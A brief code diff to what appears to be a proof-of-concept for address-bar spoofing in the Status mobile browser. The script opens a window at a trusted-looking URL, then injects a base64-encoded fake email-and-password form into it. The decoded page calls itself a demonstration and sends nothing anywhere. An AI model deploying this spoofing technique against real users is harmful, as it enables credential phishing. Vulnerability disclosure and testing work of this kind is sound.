@@ -3,7 +3,7 @@
 var encode='PGh0bWw+CjxoMT5UaGlzIGlzIG5vdCBhY3R1YWwgYWRkcmVzcywgdGhpcyBpcyBqdXN0IHRvIGRlbW9uc3RyYXRlIHNwb29mIHdlYiBhZGRyZXNzPC9oMT4KPGgyPkVudGVyIHVzZXJuYW1lIGFuZCBwYXNzd29yZCB0byBjb250aW51ZTwvaDI+Cjxmb3JtPgpFbnRlciB5b3VyIEVtYWlsOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlcm5hbWUiIHBsYWNlaG9sZGVyPSJlbWFpbCI+PGJyPgpFbnRlciB5b3VyIFBhc3N3b3JkOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icGFzc3dvcmQiIHBsYWNlaG9sZGVyPSJwYXNzIj4KPC9mb3JtPgo8L2h0bWw+';
 
 window.onclick = function(){
-  var x = window.open('status-im://browse/https://google.com')
+  var x = window.open('file:///google.com')
   setTimeout(function(){
     x.document.body.innerHTML = atob(encode);
   }, 5);
